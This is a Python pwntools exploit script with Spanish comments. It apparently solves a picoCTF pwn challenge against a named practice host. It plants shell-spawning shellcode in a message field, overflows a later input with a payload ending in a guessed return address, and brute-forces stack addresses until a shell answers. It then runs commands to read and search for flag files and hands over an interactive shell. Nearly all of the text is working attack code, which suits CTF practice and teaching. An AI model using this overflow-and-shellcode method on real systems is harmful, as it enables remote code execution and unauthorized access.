#!/usr/bin/env python3
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'critical'

HOST = 'shape-facility.picoctf.net'
PORT = 49954

shellcode = asm(shellcraft.sh())

# Probar un rango MUY amplio, incluyendo direcciones sin ASLR típicas
# Sin ASLR: stack puede estar en 0x7ffffffde000 o similar (fijo)

addresses = []

# Rango 1: Stack típico sin ASLR (0x7ffffffdXXXX)
for offset in range(0, 0x2000, 0x100):
    addresses.append(0x7ffffffde000 - 0x1000 + offset)

# Rango 2: Stack con ASLR bajo (0x7fffffffXXXX)
for offset in range(0x8000, 0xf000, 0x200):
    addresses.append(0x7fffffff0000 + offset)

print(f"[*] Probando {len(addresses)} direcciones...")
print(f"[*] Rango: {hex(min(addresses))} - {hex(max(addresses))}")

for i, addr in enumerate(addresses):
    if i % 50 == 0:
        print(f"[*] Progreso: {i}/{len(addresses)}")
    
    try:
        io = remote(HOST, PORT, level='error')
        
        io.sendlineafter(b'Exit the app\n', b'1', timeout=1)
        io.sendlineafter(b'name: \n', b'X'*4, timeout=1)
        
        io.sendlineafter(b'Exit the app\n', b'2', timeout=1)
        io.sendlineafter(b'message to?\n', b'0', timeout=1)
        io.sendlineafter(b'send them?\n', shellcode, timeout=1)
        
        payload = b'A'*8 + b'B'*4 + b'C'*8 + p64(addr)
        io.sendlineafter(b'Exit the app\n', b'3', timeout=1)
        io.sendlineafter(b'appreciate it: \n', payload, timeout=1)
        
        io.send(b'echo TEST\n')
        resp = io.recv(timeout=0.3)
        
        if b'TEST' in resp:
            print(f"\n[+] ¡¡¡SHELL OBTENIDA!!!")
            print(f"[+] Dirección: {hex(addr)}")
            
            io.sendline(b'cat flag.txt || cat /challenge/flag.txt || find / -name "*.txt" 2>/dev/null | grep flag | head -5')
            io.sendline(b'ls -la')
            io.sendline(b'pwd')
            
            data = io.recvall(timeout=3).decode(errors='ignore')
            print(data)
            
            if 'picoCTF{' in data:
                import re
                match = re.search(r'picoCTF\{[^}]+\}', data)
                if match:
                    print(f"\n{'='*60}")
                    print(f"FLAG ENCONTRADA: {match.group()}")
                    print(f"{'='*60}\n")
                    with open('/tmp/flag.txt', 'w') as f:
                        f.write(match.group())
                    sys.exit(0)
            
            io.interactive()
            sys.exit(0)
        
        io.close()
    except:
        try:
            io.close()
        except:
            pass

print("[!] No se encontró la dirección correcta")
sys.exit(1)
